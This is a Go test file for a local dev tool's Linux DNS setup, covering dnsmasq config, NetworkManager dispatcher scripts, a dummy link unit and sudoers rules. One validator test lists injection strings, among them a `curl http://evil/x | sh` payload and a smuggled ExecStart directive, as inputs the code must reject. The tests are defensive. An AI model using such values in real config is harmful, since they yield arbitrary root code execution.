//go:build linux

package dns

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- parseNmcliOutput ---

func TestParseNmcliOutput_basic(t *testing.T) {
	input := "192.168.1.1\n8.8.8.8\n\n"
	got := parseNmcliLines(input)
	want := []string{"192.168.1.1", "8.8.8.8"}
	assertSliceEqual(t, got, want)
}

func TestParseNmcliOutput_pipeSeparated(t *testing.T) {
	input := "192.168.1.1|8.8.8.8\n"
	got := parseNmcliLines(input)
	want := []string{"192.168.1.1", "8.8.8.8"}
	assertSliceEqual(t, got, want)
}

func TestParseNmcliOutput_skipsLoopbackAndDash(t *testing.T) {
	input := "127.0.0.53\n--\n\n10.0.0.1\n127.0.0.1\n"
	got := parseNmcliLines(input)
	want := []string{"10.0.0.1"}
	assertSliceEqual(t, got, want)
}

func TestParseNmcliOutput_deduplicates(t *testing.T) {
	input := "8.8.8.8\n8.8.8.8\n8.8.4.4\n"
	got := parseNmcliLines(input)
	want := []string{"8.8.8.8", "8.8.4.4"}
	assertSliceEqual(t, got, want)
}

func TestParseNmcliOutput_skipsZonedLinkLocal(t *testing.T) {
	input := "fe80::46d4:53ff:fe3f:a9a7%18|8.8.8.8\nfe80::1%eth0\n"
	got := parseNmcliLines(input)
	want := []string{"8.8.8.8"}
	assertSliceEqual(t, got, want)
}

func TestParseNmcliOutput_empty(t *testing.T) {
	got := parseNmcliLines("")
	if len(got) != 0 {
		t.Errorf("expected empty, got %v", got)
	}
}

// --- upstreamOrPasta ---

func TestUpstreamOrPasta_usesUpstreamsWhenPresent(t *testing.T) {
	fakeResolv := writeTempFile(t, "nameserver 8.8.8.8\n")
	origPaths := resolvPaths
	resolvPaths = []string{fakeResolv}
	defer func() { resolvPaths = origPaths }()

	got := upstreamOrPasta()
	assertSliceEqual(t, got, []string{"8.8.8.8"})
}

func TestUpstreamOrPasta_fallsBackToPastaForwarder(t *testing.T) {
	emptyResolv := writeTempFile(t, "# empty\n")
	origPaths := resolvPaths
	origNmcli := nmcliDNSFunc
	resolvPaths = []string{emptyResolv}
	nmcliDNSFunc = func() []string { return nil }
	defer func() { resolvPaths = origPaths; nmcliDNSFunc = origNmcli }()

	got := upstreamOrPasta()
	assertSliceEqual(t, got, []string{pastaDefaultForwarder})
}

// --- parseDefaultInterface ---

func TestParseDefaultInterface_typical(t *testing.T) {
	input := "default via 192.168.1.1 dev enp1s0 proto dhcp src 192.168.1.100 metric 100"
	got := parseDefaultIface(input)
	if got != "enp1s0" {
		t.Errorf("expected enp1s0, got %q", got)
	}
}

func TestParseDefaultInterface_wifi(t *testing.T) {
	input := "default via 10.0.0.1 dev wlp2s0 proto dhcp metric 600"
	got := parseDefaultIface(input)
	if got != "wlp2s0" {
		t.Errorf("expected wlp2s0, got %q", got)
	}
}

func TestParseDefaultInterface_multipleRoutes(t *testing.T) {
	input := "default via 192.168.1.1 dev eth0 proto dhcp\ndefault via 10.0.0.1 dev eth1 proto static"
	got := parseDefaultIface(input)
	if got != "eth0" {
		t.Errorf("expected eth0, got %q", got)
	}
}

func TestParseDefaultInterface_empty(t *testing.T) {
	got := parseDefaultIface("")
	if got != "" {
		t.Errorf("expected empty, got %q", got)
	}
}

// --- WriteDnsmasqConfig ---

func TestWriteDnsmasqConfig_withUpstreams(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())

	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 192.168.1.1\nnameserver 8.8.8.8\n")
	origPaths := resolvPaths
	resolvPaths = []string{fakeResolv}
	defer func() { resolvPaths = origPaths }()

	if err := WriteDnsmasqConfig(dir); err != nil {
		t.Fatalf("WriteDnsmasqConfig: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))

	assertContains(t, content, "port=5300")
	assertContains(t, content, "no-resolv")
	assertContains(t, content, "server=192.168.1.1")
	assertContains(t, content, "server=8.8.8.8")
	assertContains(t, content, "address=/.test/127.0.0.1")
}

func TestWriteDnsmasqConfig_noUpstreamsFallsBackToPasta(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())

	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 127.0.0.53\n")
	origPaths := resolvPaths
	origNmcli := nmcliDNSFunc
	resolvPaths = []string{fakeResolv}
	nmcliDNSFunc = func() []string { return nil }
	defer func() {
		resolvPaths = origPaths
		nmcliDNSFunc = origNmcli
	}()

	if err := WriteDnsmasqConfig(dir); err != nil {
		t.Fatalf("WriteDnsmasqConfig: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))

	assertContains(t, content, "port=5300")
	assertContains(t, content, "address=/.test/127.0.0.1")
	assertContains(t, content, "address=/.test/::1")
	assertContains(t, content, "no-resolv")
	assertContains(t, content, "server="+pastaDefaultForwarder)
	if strings.Contains(content, "listen-address") {
		t.Errorf("dnsmasq must not restrict listen-address (rootlessport forwards via container netif, not loopback), got:\n%s", content)
	}
}

func TestWriteDnsmasqConfig_pinnedUpstreamOverridesResolv(t *testing.T) {
	writeGlobalConfig(t, "dns:\n  upstream:\n    - 192.168.100.129\n")
	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 9.9.9.9\nnameserver 8.8.8.8\n")
	origPaths := resolvPaths
	resolvPaths = []string{fakeResolv}
	defer func() { resolvPaths = origPaths }()

	if err := WriteDnsmasqConfig(dir); err != nil {
		t.Fatalf("WriteDnsmasqConfig: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))
	assertContains(t, content, "server=192.168.100.129")
	if strings.Contains(content, "server=9.9.9.9") || strings.Contains(content, "server=8.8.8.8") {
		t.Errorf("pinned upstream must replace detected resolv.conf servers, got:\n%s", content)
	}
}

// --- NM dispatcher script ---

func TestNMDispatcherScript_runsAsRealUser(t *testing.T) {
	assertContains(t, nmDispatcherScriptFor("test"), "runuser -u")
}

func TestNMDispatcherScript_prefersPinnedUpstream(t *testing.T) {
	assertContains(t, nmDispatcherScriptFor("test"), "upstream:")
	assertContains(t, nmDispatcherScriptFor("test"), "dns_servers=\"$LERD_DNS\"")
}

// The dispatcher runs as root, so writing the per-user lerd.conf with a plain
// root `> "$config_file"` redirect lets a user symlink that path at a root-owned
// file and have root truncate it (CWE-59 privesc). The write must go through
// runuser ($as_user) so it happens with the owning user's privileges.
func TestNMDispatcherScript_writesConfigAsUser(t *testing.T) {
	assertContains(t, nmDispatcherScriptFor("test"), `| $as_user tee "$config_file"`)
	if strings.Contains(nmDispatcherScriptFor("test"), `} > "$config_file"`) {
		t.Error("dispatcher still writes lerd.conf via a root redirect; must pipe through $as_user")
	}
}

// The awk re-parse of dns.upstream applies no validation, so the server-entry
// loop must filter to IP/port-shaped tokens before emitting server= lines.
func TestNMDispatcherScript_filtersUpstreamEntries(t *testing.T) {
	assertContains(t, nmDispatcherScriptFor("test"), "*[!0-9A-Fa-f:.#]*) continue")
}

// The address records are lerd policy: loopback normally, the host's LAN IP
// under lan:expose, and only the Go side knows which. The dispatcher used to
// regenerate them from a hardcoded template on every interface "up", which
// clobbered lan:expose back to loopback and dropped the AAAA record (costing
// ~20s per offline .test lookup). It must carry the existing records over.
func TestNMDispatcherScript_preservesAddressRecords(t *testing.T) {
	assertContains(t, nmDispatcherScriptFor("test"), `addr_records=$(grep '^address=/' "$config_file"`)
	assertContains(t, nmDispatcherScriptFor("test"), `printf '%s\n' "$addr_records"`)
	if strings.Contains(nmDispatcherScriptFor("test"), `printf 'address=/.%s/127.0.0.1\n' "$tld"`) {
		t.Error("dispatcher must not regenerate address records; it clobbers lan:expose and drops the AAAA record")
	}
}

// The address records must be read before the rewrite pipeline runs: tee
// truncates config_file the moment it opens it, so a grep inside the pipeline
// races against an already-empty file and would silently drop the records.
func TestNMDispatcherScript_readsAddressRecordsBeforePipeline(t *testing.T) {
	grepAt := strings.Index(nmDispatcherScriptFor("test"), `addr_records=$(grep '^address=/'`)
	teeAt := strings.Index(nmDispatcherScriptFor("test"), `} | $as_user tee "$config_file"`)
	if grepAt < 0 || teeAt < 0 {
		t.Fatal("dispatcher is missing the address-record read or the tee pipeline")
	}
	if grepAt > teeAt {
		t.Error("address records must be read before the tee pipeline truncates the file")
	}
}

// lerd0 is unmanaged, so NM never dispatches for it. The script should bail out
// early rather than trying to read upstream DNS off a link that has none.
func TestNMDispatcherScript_ignoresDummyLink(t *testing.T) {
	assertContains(t, nmDispatcherScriptFor("test"), `if [ "$IFACE" = "lerd0" ]; then`)
	if strings.Contains(nmDispatcherScriptFor("test"), "resolvectl dns lerd0") {
		t.Error("lerd-dns-link.service owns lerd0's route; the dispatcher must not set it")
	}
}

// lerd owns lerd0 through a system unit and tells NM to leave it alone. An
// NM-managed connection appears as a togglable network in the desktop's network
// menu, where switching it off silently breaks offline .test resolution.
func TestLerdLinkUnit_shape(t *testing.T) {
	assertContains(t, lerdNMUnmanagedContent, "unmanaged-devices=interface-name:lerd0")
	assertContains(t, lerdLinkUnitContentFor("test"), "ip link add lerd0 type dummy")
	assertContains(t, lerdLinkUnitContentFor("test"), "resolvectl domain lerd0 ~test")
	assertContains(t, lerdLinkUnitContentFor("test"), "After=systemd-resolved.service")
	assertContains(t, lerdLinkUnitContentFor("test"), "WantedBy=multi-user.target")
	assertContains(t, lerdLinkUnitContentFor("test"), "ip link del lerd0")
}

// systemd-resolved only gives a link a DNS scope once it carries a routable
// address. With a link-local address alone lerd0 reports "Current Scopes: none"
// and .test does not resolve offline at all, which defeats the link's purpose.
// The address must come from a range that cannot exist on a real network, so the
// /32 local route can't shadow a host the user needs to reach: RFC 5737
// TEST-NET-1 (192.0.2.0/24) is reserved for documentation and fits exactly.
func TestLerdLinkUnit_carriesReservedAddress(t *testing.T) {
	assertContains(t, lerdLinkUnitContentFor("test"), "ip addr replace "+lerdDummyAddr+" dev lerd0")
	if !strings.HasPrefix(lerdDummyAddr, "192.0.2.") {
		t.Errorf("lerd0 address %q must come from RFC 5737 TEST-NET-1, which never appears on a real network", lerdDummyAddr)
	}
	if !strings.HasSuffix(lerdDummyAddr, "/32") {
		t.Errorf("lerd0 address %q must be a /32 so it claims exactly one address", lerdDummyAddr)
	}
}

// lerd0 must carry ~test only, never ~.: with ~. every non-.test query offline
// would be funnelled through lerd-dns into a then-unreachable upstream and stall.
func TestLerdLinkUnit_routesTestDomainOnly(t *testing.T) {
	if strings.Contains(lerdLinkUnitContentFor("test"), "~test ~.") {
		t.Error("lerd0 must carry ~test only (~. would funnel all DNS through lerd-dns offline)")
	}
}

// The watcher reapplies DNS config headless, so every privileged step must be
// granted passwordless or it blocks on a prompt no one can answer.
func TestLinuxSudoers_grantsDummyLinkOps(t *testing.T) {
	content := renderLinuxSudoers("alice")
	for _, want := range []string{
		"/usr/bin/tee /etc/systemd/system/lerd-dns-link.service",
		"/usr/bin/chmod 644 /etc/systemd/system/lerd-dns-link.service",
		"/usr/bin/tee /etc/NetworkManager/conf.d/lerd-dns-link.conf",
		"/usr/bin/chmod 644 /etc/NetworkManager/conf.d/lerd-dns-link.conf",
		"/usr/bin/systemctl daemon-reload",
		"/usr/bin/systemctl enable --now lerd-dns-link.service",
		"/usr/bin/systemctl restart lerd-dns-link.service",
		"/usr/bin/systemctl reload NetworkManager",
		"/usr/bin/nmcli connection delete lerd-dns",
	} {
		assertContains(t, content, want)
	}
}

// A sudoers drop-in with no %s substituted for the user parses as a rule for a
// literal "%s" user and grants nothing, so guard the format-arg count.
func TestLinuxSudoers_everyRuleNamesTheUser(t *testing.T) {
	content := renderLinuxSudoers("alice")
	if strings.Contains(content, "%!s(MISSING)") || strings.Contains(content, "%!(EXTRA") {
		t.Fatalf("sudoers format args mismatch:\n%s", content)
	}
	for _, line := range strings.Split(content, "\n") {
		if !strings.Contains(line, "NOPASSWD") {
			continue
		}
		if !strings.HasPrefix(line, "alice ALL=(root) NOPASSWD: /") {
			t.Errorf("malformed sudoers rule: %q", line)
		}
	}
}

// --- WriteDnsmasqConfigFor ---

func TestWriteDnsmasqConfigFor_customTarget(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 127.0.0.53\n")
	origPaths := resolvPaths
	origNmcli := nmcliDNSFunc
	resolvPaths = []string{fakeResolv}
	nmcliDNSFunc = func() []string { return nil }
	defer func() { resolvPaths = origPaths; nmcliDNSFunc = origNmcli }()

	if err := WriteDnsmasqConfigFor(dir, "10.0.0.5"); err != nil {
		t.Fatalf("WriteDnsmasqConfigFor: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))
	assertContains(t, content, "address=/.test/10.0.0.5")
	assertContains(t, content, "no-resolv")
	assertContains(t, content, "server="+pastaDefaultForwarder)
}

func TestWriteDnsmasqConfigFor_emptyTargetDefaults(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 127.0.0.53\n")
	origPaths := resolvPaths
	origNmcli := nmcliDNSFunc
	resolvPaths = []string{fakeResolv}
	nmcliDNSFunc = func() []string { return nil }
	defer func() { resolvPaths = origPaths; nmcliDNSFunc = origNmcli }()

	if err := WriteDnsmasqConfigFor(dir, ""); err != nil {
		t.Fatalf("WriteDnsmasqConfigFor: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))
	assertContains(t, content, "address=/.test/127.0.0.1")
}

// --- v6 dnsmasq output ---

func TestWriteDnsmasqConfig_emitsV6Listen(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 8.8.8.8\n")
	origPaths := resolvPaths
	resolvPaths = []string{fakeResolv}
	defer func() { resolvPaths = origPaths }()

	if err := WriteDnsmasqConfig(dir); err != nil {
		t.Fatalf("WriteDnsmasqConfig: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))
	assertContains(t, content, "address=/.test/127.0.0.1")
	assertContains(t, content, "address=/.test/::1")
}

func TestWriteDnsmasqConfigDual_skipsV6WhenEmpty(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	dir := t.TempDir()
	fakeResolv := writeTempFile(t, "nameserver 8.8.8.8\n")
	origPaths := resolvPaths
	resolvPaths = []string{fakeResolv}
	defer func() { resolvPaths = origPaths }()

	if err := WriteDnsmasqConfigDual(dir, "10.0.0.5", ""); err != nil {
		t.Fatalf("WriteDnsmasqConfigDual: %v", err)
	}
	content := readFile(t, filepath.Join(dir, "lerd.conf"))
	assertContains(t, content, "address=/.test/10.0.0.5")
	if strings.Contains(content, "address=/.test/::") {
		t.Errorf("expected no v6 address record when v6Target empty, got:\n%s", content)
	}
}

func TestDeriveV6Target(t *testing.T) {
	cases := []struct {
		v4   string
		want string
	}{
		{"", "::1"},
		{"127.0.0.1", "::1"},
	}
	for _, c := range cases {
		if got := deriveV6Target(c.v4); got != c.want {
			t.Errorf("deriveV6Target(%q) = %q, want %q", c.v4, got, c.want)
		}
	}
	// A LAN target derives to the host's global v6 when it has one, or ""
	// (no AAAA record) when it doesn't. It must never fall back to ::1, which
	// would wrongly answer remote AAAA queries with loopback. We can't pin the
	// exact value (host-dependent), but it must not be ::1.
	if got := deriveV6Target("10.0.0.5"); got == "::1" {
		t.Error("deriveV6Target(LAN) must not fall back to ::1")
	}
}

// --- lerdDNSInterfaces parsing ---

func TestLerdDNSInterfaces_multipleLinks(t *testing.T) {
	output := `Global
           Protocols: +LLMNR +mDNS
    resolv.conf mode: foreign

Link 2 (enp14s0)
    Current Scopes: DNS
Current DNS Server: 192.168.0.151
       DNS Servers: 192.168.0.151

Link 3 (wlan0)
    Current Scopes: none

Link 4 (virbr0)
    Current Scopes: DNS
Current DNS Server: 127.0.0.1:5300
       DNS Servers: 127.0.0.1:5300
        DNS Domain: ~test ~.

Link 6 (vnet1)
    Current Scopes: DNS
Current DNS Server: 127.0.0.1:5300
       DNS Servers: 127.0.0.1:5300
        DNS Domain: ~test ~.
`
	ifaces := parseLerdDNSInterfaces(output)
	want := []string{"virbr0", "vnet1"}
	assertSliceEqual(t, ifaces, want)
}

func TestLerdDNSInterfaces_none(t *testing.T) {
	output := `Link 2 (enp14s0)
Current DNS Server: 192.168.0.151
       DNS Servers: 192.168.0.151
`
	ifaces := parseLerdDNSInterfaces(output)
	if len(ifaces) != 0 {
		t.Errorf("expected empty, got %v", ifaces)
	}
}

// --- ResolverHint ---

func TestResolverHint_NetworkManager(t *testing.T) {
	origNM := isNetworkManagerActive
	origResolved := isSystemdResolvedActive
	defer func() { isNetworkManagerActive = origNM; isSystemdResolvedActive = origResolved }()

	isNetworkManagerActive = func() bool { return true }
	isSystemdResolvedActive = func() bool { return true }

	got := ResolverHint()
	if got != "sudo systemctl restart NetworkManager" {
		t.Errorf("expected NM hint, got %q", got)
	}
}

func TestResolverHint_SystemdResolvedOnly(t *testing.T) {
	origNM := isNetworkManagerActive
	origResolved := isSystemdResolvedActive
	defer func() { isNetworkManagerActive = origNM; isSystemdResolvedActive = origResolved }()

	isNetworkManagerActive = func() bool { return false }
	isSystemdResolvedActive = func() bool { return true }

	got := ResolverHint()
	if got != "sudo systemctl restart systemd-resolved" {
		t.Errorf("expected systemd-resolved hint, got %q", got)
	}
}

func TestResolverHint_NoResolver(t *testing.T) {
	origNM := isNetworkManagerActive
	origResolved := isSystemdResolvedActive
	defer func() { isNetworkManagerActive = origNM; isSystemdResolvedActive = origResolved }()

	isNetworkManagerActive = func() bool { return false }
	isSystemdResolvedActive = func() bool { return false }

	got := ResolverHint()
	if got != "restart your DNS resolver" {
		t.Errorf("expected generic hint, got %q", got)
	}
}

// --- helpers (Linux-only) ---

func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

// A host that upgraded the binary without re-running install still has the old
// sudoers grants, and the watcher reapplies DNS config headless where a password
// prompt would hang forever. The grants are probed before any privileged step,
// and a stale drop-in downgrades to a warning rather than failing the start:
// online .test still resolves over the per-interface route either way.
func TestSetupDummyLink_skipsWhenSudoersGrantsAreStale(t *testing.T) {
	orig := dummyLinkGrantsLive
	t.Cleanup(func() { dummyLinkGrantsLive = orig })

	probed := false
	dummyLinkGrantsLive = func() bool { probed = true; return false }

	if err := setupDummyLink(true, "test"); err == nil {
		t.Fatal("setupDummyLink must report an error when the grants are stale, or callers remove the hookup it was meant to replace")
	}
	if !probed {
		t.Error("setupDummyLink must probe the sudoers grants before running any privileged step")
	}
}

// On a host with no NetworkManager (Arch/omarchy: resolved + networkd + iwd),
// the unmanaged rule is pointless, and writing it would create an
// /etc/NetworkManager tree on a machine that has no NetworkManager at all.
func TestDummyLinkNMRuleNeeded_neverWithoutNetworkManager(t *testing.T) {
	if dummyLinkNMRuleNeeded(false) {
		t.Error("must not write the NetworkManager rule on a host without NetworkManager")
	}
}

// Enablement and health are different questions, and conflating them loses lerd0
// at the next boot: a link that happens to be up right now (left over, or made by
// hand) must not stop the unit being enabled, because enabled is the only thing
// that brings it back after a reboot.
func TestEnsureDummyLinkRunning_checksEnablementEvenWhenLinkAlreadyUp(t *testing.T) {
	origHealthy, origEnabled := dummyLinkHealthy, dummyLinkUnitEnabled
	t.Cleanup(func() { dummyLinkHealthy, dummyLinkUnitEnabled = origHealthy, origEnabled })

	dummyLinkHealthy = func(string) bool { return true } // link is up right now
	askedEnabled := false
	// Report enabled so no privileged command runs during the test.
	dummyLinkUnitEnabled = func() bool { askedEnabled = true; return true }

	ensureDummyLinkRunning("test")

	if !askedEnabled {
		t.Error("enablement must be checked even when the link is already healthy, or lerd0 is gone after the next reboot")
	}
}

// lerd0 is what stops resolved answering "Network is down" instantly while
// offline, which is the point for .test, but the same flag makes resolved chase
// unreachable fallback servers for every other name, hanging each offline lookup
// for 20s+. Turning the fallbacks off is the only lever that removes the hang,
// and it is a no-op on Debian, Ubuntu and Fedora, which ship them off already.
func TestLerdFallbackDropin_disablesFallbackServers(t *testing.T) {
	assertContains(t, lerdFallbackDropinContent, "[Resolve]")
	assertContains(t, lerdFallbackDropinContent, "FallbackDNS=")
	// A value here would set fallbacks rather than clear them.
	for _, line := range strings.Split(lerdFallbackDropinContent, "\n") {
		if strings.HasPrefix(line, "FallbackDNS=") && strings.TrimSpace(line) != "FallbackDNS=" {
			t.Errorf("FallbackDNS must be cleared, not assigned: %q", line)
		}
	}
	if !strings.HasSuffix(lerdFallbackDropin, ".conf") || !strings.Contains(lerdFallbackDropin, "/etc/systemd/resolved.conf.d/") {
		t.Errorf("fallback drop-in %q must live in resolved.conf.d", lerdFallbackDropin)
	}
	// Must not collide with the drop-in the no-NetworkManager path writes, which
	// setupNMWithResolved deletes as a stale artefact.
	if lerdFallbackDropin == "/etc/systemd/resolved.conf.d/lerd.conf" {
		t.Error("fallback drop-in must not reuse the resolver drop-in's path; the NM path deletes that file")
	}
}

// Turning the fallbacks off is lerd's doing and only justified while lerd0 is
// there. Leaving the drop-in behind on uninstall would silently keep the user's
// DNS changed forever, so Teardown has to take it back out.
func TestTeardown_removesFallbackDropin(t *testing.T) {
	src, err := os.ReadFile("setup.go")
	if err != nil {
		t.Fatalf("reading setup.go: %v", err)
	}
	_, teardown, found := strings.Cut(string(src), "func Teardown()")
	if !found {
		t.Fatal("Teardown not found in setup.go")
	}
	if !strings.Contains(teardown, "lerdFallbackDropin") {
		t.Error("Teardown must remove the fallback drop-in, or uninstalling lerd leaves the system's fallback DNS off for good")
	}
}

// The link and everything that reads it must agree on the TLD. lerd supports a
// custom dns.tld, and hardcoding "test" in the unit means lerd0 carries a route
// for a domain the user does not use: offline .tld resolution silently does
// nothing for them, and the diagnostic that checks it warns forever.
func TestLerdLinkUnit_usesTheConfiguredTLD(t *testing.T) {
	unit := lerdLinkUnitContentFor("dev")
	assertContains(t, unit, "resolvectl domain lerd0 ~dev")
	assertContains(t, unit, "Description=lerd .dev DNS link")
	if strings.Contains(unit, "~test") {
		t.Error("the unit must carry the configured TLD, not a hardcoded ~test")
	}
}

// The grants probe must answer "does this go through without a password", not
// "is george allowed to sudo at all". `sudo -n -l <cmd>` answers the second, and
// on any normal desktop (george ALL=(ALL) ALL) it succeeds even with no lerd
// grants at all, so the guard could never fire where it was needed.
func TestDummyLinkGrantsLive_runsAGrantedCommandRatherThanAskingSudoL(t *testing.T) {
	src, err := os.ReadFile("setup.go")
	if err != nil {
		t.Fatalf("reading setup.go: %v", err)
	}
	body, _, found := strings.Cut(string(src), "// dummyLinkNMRuleNeeded")
	if !found {
		t.Fatal("could not isolate the probe")
	}
	_, probe, found := strings.Cut(body, "var dummyLinkGrantsLive")
	if !found {
		t.Fatal("dummyLinkGrantsLive not found")
	}
	if strings.Contains(probe, `"-l"`) {
		t.Error(`the probe must not use "sudo -n -l": that reports whether the user MAY run the command, which is true for any sudoer regardless of the NOPASSWD grants`)
	}
	assertContains(t, probe, `"sudo", "-n"`)
}

// The TLD is interpolated into the shell command of a root-owned systemd unit
// that lerd writes and starts through its own passwordless sudo grants, so a
// config.yaml carrying a crafted dns.tld would be arbitrary code as root. Nothing
// that is not a DNS label may reach ConfiguredTLD's callers.
func TestConfiguredTLD_rejectsAnythingThatIsNotADNSLabel(t *testing.T) {
	for _, bad := range []string{
		`test'; curl http://evil/x | sh; #`, // closes the ExecStart quote
		"test\nExecStart=/bin/sh -c 'id'",   // injects a second unit directive
		"$(id)", "`id`", "te st", "-lead", "trail-", "", "../../etc",
	} {
		if tldPattern.MatchString(bad) {
			t.Errorf("tldPattern accepted %q, which would reach a root shell", bad)
		}
	}
	for _, good := range []string{"test", "dev", "local8", "my-tld", "x"} {
		if !tldPattern.MatchString(good) {
			t.Errorf("tldPattern rejected the usable TLD %q", good)
		}
	}
}

// Belt and braces: a TLD that passes the pattern lands in the unit as an inert
// word and cannot terminate the quoting around ExecStart's shell command.
func TestLerdLinkUnit_tldLandsInertInTheUnit(t *testing.T) {
	unit := lerdLinkUnitContentFor("my-tld")
	assertContains(t, unit, "resolvectl domain lerd0 ~my-tld'")
	if strings.Count(unit, "ExecStart=") != 1 {
		t.Error("the TLD must not be able to introduce a second ExecStart")
	}
}

// lerd0 is the offline enhancement, never a precondition. Hosts exist where the
// dummy module is absent (the stock WSL2 kernel) or lerd's absolute-path grants
// cannot match (NixOS). Making the link fatal took .tld down entirely on those
// hosts, which is strictly worse than the behaviour it replaced: the baseline
// hookup resolves .tld whenever a link is up, and must be written regardless.
func TestSetupPaths_treatTheLinkAsAnEnhancementNotAPrecondition(t *testing.T) {
	src, err := os.ReadFile("setup.go")
	if err != nil {
		t.Fatalf("reading setup.go: %v", err)
	}
	body := string(src)

	nm := section(t, body, "func setupNMWithResolved() error {", "// setupSystemdResolved")
	if strings.Contains(nm, "if err := setupDummyLink(true, tld); err != nil {\n\t\treturn err") {
		t.Error("setupNMWithResolved must not abort on a link failure: the per-interface route below it is what makes .tld resolve at all")
	}
	assertContains(t, nm, "WARN: offline")

	res := section(t, body, "func setupSystemdResolved() error {", "// setupNetworkManager")
	// The baseline must be written before the link is attempted.
	dropinAt := strings.Index(res, "sudoWriteFile(dropin")
	linkAt := strings.Index(res, "setupDummyLink(false, tld)")
	if dropinAt < 0 || linkAt < 0 {
		t.Fatal("expected setupSystemdResolved to write the baseline drop-in and then try the link")
	}
	if dropinAt > linkAt {
		t.Error("the baseline drop-in must be written before the link is attempted, or a fresh host with no link has no hookup at all")
	}
	// And removed only after the link is proven.
	rmAt := strings.Index(res, `"rm", "-f", dropin`)
	if rmAt < 0 || rmAt < linkAt {
		t.Error("the drop-in may only be removed after the link is confirmed carrying the route")
	}
}

// dns:disable flips the TLD to localhost and stops lerd-dns. Carrying on into
// resolver setup there prompts for a password on a host that opted out and points
// a ~localhost route at a container that is deliberately not running.
func TestConfigureResolver_doesNothingWhenDNSIsDisabled(t *testing.T) {
	src, err := os.ReadFile("setup.go")
	if err != nil {
		t.Fatalf("reading setup.go: %v", err)
	}
	fn := section(t, string(src), "func ConfigureResolver() error {", "func setupDummyLink")
	assertContains(t, fn, "!cfg.DNS.Enabled")
	if strings.Index(fn, "!cfg.DNS.Enabled") > strings.Index(fn, "isSystemdResolvedActive()") {
		t.Error("the disabled check must come before any resolver path runs")
	}
}

// section returns the source between two markers, failing the test if either is
// missing so a rename cannot silently turn these guards into no-ops.
func section(t *testing.T, body, from, to string) string {
	t.Helper()
	i := strings.Index(body, from)
	if i < 0 {
		t.Fatalf("marker %q not found", from)
	}
	rest := body[i:]
	j := strings.Index(rest, to)
	if j < 0 {
		t.Fatalf("marker %q not found after %q", to, from)
	}
	return rest[:j]
}
